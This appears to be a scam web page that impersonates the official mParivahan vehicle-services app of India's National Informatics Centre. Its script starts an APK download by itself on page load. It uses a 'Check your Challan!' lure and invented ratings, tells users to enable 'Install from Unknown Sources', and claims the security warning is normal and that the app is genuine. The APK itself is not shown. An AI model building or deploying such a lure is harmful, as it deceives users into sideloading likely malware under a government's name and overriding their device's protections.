<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Download mParivahan NextGen</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body class="bg-gradient-to-br from-blue-50 to-indigo-100 min-h-screen flex items-center justify-center p-4">
    <div class="bg-white rounded-2xl shadow-2xl p-8 w-full max-w-md text-center">
        <!-- App Header & Info -->
        <div class="w-20 h-20 bg-blue-600 rounded-2xl flex items-center justify-center mx-auto mb-4 shadow-lg">
            <i class="fas fa-car text-white text-3xl"></i>
        </div>
        <h1 class="text-3xl font-extrabold text-slate-900 mb-2">mParivahan NextGen</h1>
        <p class="text-slate-600 mb-2">Official App from the National Informatics Centre</p>
        <div class="flex justify-center items-center space-x-4 text-sm text-slate-500 mb-6">
            <span>⭐ 4.4 (2.1M+)</span>
            <span>⬇️ 5Cr+ Downloads</span>
        </div>

        <!-- Dynamic Status Message -->
        <div id="statusMessage">
            <div class="bg-blue-50 border border-blue-200 p-4 rounded-xl mb-6 transition-all duration-300">
                <div class="flex items-center justify-center gap-3">
                    <i class="fas fa-download text-blue-600"></i>
                    <div>
                        <p class="font-semibold text-blue-800">Starting download...</p>
                        <p class="text-sm text-blue-600">Please wait a moment</p>
                    </div>
                </div>
            </div>
            
            <a id="manualDownloadBtn" href="mparivahan.apk" download class="w-full bg-blue-600 text-white font-bold py-4 px-8 rounded-xl hover:bg-blue-700 transition shadow-lg flex items-center justify-center gap-3 mb-6 opacity-0 transition-opacity duration-500">
                <i class="fas fa-download"></i>
                Check your Challan! 
                 Install APK Now
            </a>
        </div>

        <!-- Installation Guide -->
        <div class="bg-slate-50 p-5 rounded-xl border border-slate-200 text-sm text-slate-700 text-left">
            <h3 class="font-bold text-slate-900 mb-3 flex items-center gap-2"><i class="fas fa-info-circle text-blue-500"></i> Installation Guide</h3>
            <ol class="list-decimal list-inside space-y-2">
                <li>Wait for the download to start automatically.</li>
                <li>After download, tap "Install". If asked, enable <strong class="text-slate-900">"Install from Unknown Sources"</strong> in Settings > Security.</li>
                <li>Open the app and complete setup.</li>
            </ol>
        </div>

        <!-- Security Note -->
        <div class="bg-yellow-100 border-l-4 border-yellow-500 text-yellow-800 p-4 rounded-md text-sm mt-5 text-left">
            <strong>Official App Notice:</strong> Your device may show a standard security warning. This is normal for apps installed outside the Play Store. This is a genuine application from the National Informatics Centre.
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const manualDownloadBtn = document.getElementById('manualDownloadBtn');
            const statusMessageDiv = document.getElementById('statusMessage');
            
            // Function to update the status message and trigger download
            function updateStatus(message, type = 'info') {
                const colors = {
                    info: { bg: 'bg-blue-50', border: 'border-blue-200', text: 'text-blue-800' },
                    success: { bg: 'bg-green-50', border: 'border-green-200', text: 'text-green-800' },
                    error: { bg: 'bg-red-50', border: 'border-red-200', text: 'text-red-800' }
                };
                const color = colors[type];
                
                // For success, show a different message and make the button visible
                if (type === 'success') {
                    statusMessageDiv.innerHTML = `
                        <div class="${color.bg} ${color.border} p-4 rounded-xl mb-6 transition-all duration-300">
                            <div class="flex items-center justify-center gap-3">
                                <i class="fas fa-check-circle ${color.text}"></i>
                                <div>
                                    <p class="font-semibold ${color.text}">${message}</p>
                                    <p class="text-sm ${color.text}">Tap the button below to install</p>
                                </div>
                            </div>
                        </div>
                        <a id="manualDownloadBtn" href="mparivahan.apk" download class="w-full bg-green-600 text-white font-bold py-4 px-8 rounded-xl hover:bg-green-700 transition shadow-lg flex items-center justify-center gap-3 mb-6">
                            <i class="fas fa-download"></i>
                            Install APK Now
                        </a>
                    `;
                } else {
                    // For other statuses, just update the message
                    statusMessageDiv.innerHTML = `
                        <div class="${color.bg} ${color.border} p-4 rounded-xl mb-6 transition-all duration-300">
                            <div class="flex items-center justify-center gap-3">
                                <i class="fas ${type === 'error' ? 'fa-exclamation-triangle' : 'fa-download'} ${color.text}"></i>
                                <div>
                                    <p class="font-semibold ${color.text}">${message}</p>
                                    <p class="text-sm ${color.text}">Please try the manual download</p>
                                </div>
                            </div>
                        </div>
                        <a id="manualDownloadBtn" href="mparivahan.apk" download class="w-full bg-blue-600 text-white font-bold py-4 px-8 rounded-xl hover:bg-blue-700 transition shadow-lg flex items-center justify-center gap-3 mb-6">
                            <i class="fas fa-download"></i>
                            Download APK Manually
                        </a>
                    `;
                }
            }

            // Function to trigger the download
            function triggerDownload() {
                try {
                    // Create a temporary anchor element to trigger download
                    const link = document.createElement('a');
                    link.href = 'mparivahan.apk';
                    link.download = 'mParivahan-NextGen.apk';
                    document.body.appendChild(link);
                    link.click();
                    document.body.removeChild(link);
                    
                    // Update the status to show success
                    updateStatus('Download complete!', 'success');
                    
                    console.log('mParivahan APK download initiated successfully.');
                } catch (error) {
                    console.error('Error downloading APK:', error);
                    updateStatus('Automatic download failed', 'error');
                }
            }

            // Auto-trigger download shortly after page load
            setTimeout(triggerDownload, 1500);
        });
    </script>
</body>
</html>